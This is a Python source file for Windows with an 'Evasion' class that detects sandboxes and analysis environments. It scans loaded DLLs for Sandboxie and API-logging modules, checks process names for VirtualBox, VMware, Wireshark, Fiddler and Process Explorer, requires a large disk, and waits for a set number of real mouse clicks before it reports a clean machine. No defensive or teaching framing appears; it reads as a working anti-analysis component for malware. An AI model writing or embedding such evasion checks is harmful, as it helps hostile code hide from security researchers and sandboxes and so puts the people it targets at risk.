import win32api
import win32process
import sys
import psutil
import time
from winreg import *
from ctypes import *

class Evasion:
    def __init__(self):
        self.disk_check_result = None
    def check_all_DLL_names(self):
        SandboxEvidence = []
        sandboxDLLs = ["sbiedll.dll", "api_log.dll", "dir_watch.dll",
                       "pstorec.dll", "vmcheck.dll", "wpespy.dll"]
        allPids = win32process.EnumProcesses()
        for pid in allPids[:50]:
            try:
                hProcess = win32api.OpenProcess(0x0410, 0, pid)
                curProcessDLLs = win32process.EnumProcessModules(hProcess)
                for dll in curProcessDLLs:
                    dllName = str(win32process.GetModuleFileNameEx(hProcess, dll)).lower()
                    if any(sandboxDLL in dllName for sandboxDLL in sandboxDLLs):
                        if dllName not in SandboxEvidence:
                            SandboxEvidence.append(dllName)

                win32api.CloseHandle(hProcess)
            except:
                continue
        return not SandboxEvidence
    def check_all_processes_names(self):
        sandboxProcesses = {
            "vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler",
            "vbox", "process explorer", "autoit", "vboxtray", "vmtools",
            "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet",
            "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs"
        }
        try:
            for proc in psutil.process_iter(['name']):
                pname = proc.info['name']
                if pname:
                    for sandboxProc in sandboxProcesses:
                        if sandboxProc.lower() in pname.lower():
                            return False
        except Exception:
            pass
        return True

    def disk_size(self):
        if self.disk_check_result is not None:
            return self.disk_check_result
        minDiskSizeGB = 50
        if len(sys.argv) > 1:
            minDiskSizeGB = float(sys.argv[1])
        _, diskSizeBytes, _ = win32api.GetDiskFreeSpaceEx()
        diskSizeGB = diskSizeBytes / 1073741824
        self.disk_check_result = diskSizeGB > minDiskSizeGB
        return self.disk_check_result

    def click_tracker(self):
        count = 0
        minClicks = 10
        if len(sys.argv) == 2:
            minClicks = int(sys.argv[1])
        while count < minClicks:
            new_state_left_click = win32api.GetAsyncKeyState(1)
            new_state_right_click = win32api.GetAsyncKeyState(2)
            if new_state_left_click % 2 == 1:
                count += 1
                time.sleep(0.2)
            if new_state_right_click % 2 == 1:
                count += 1
                time.sleep(0.2)
            time.sleep(0.05)
        return True

    def main(self):
        if (
            self.disk_size() and
            self.click_tracker() and
            self.check_all_processes_names() and
            self.check_all_DLL_names()
        ):
            return True
        else:
            return False

def test():
    evasion = Evasion()
    return evasion.main()
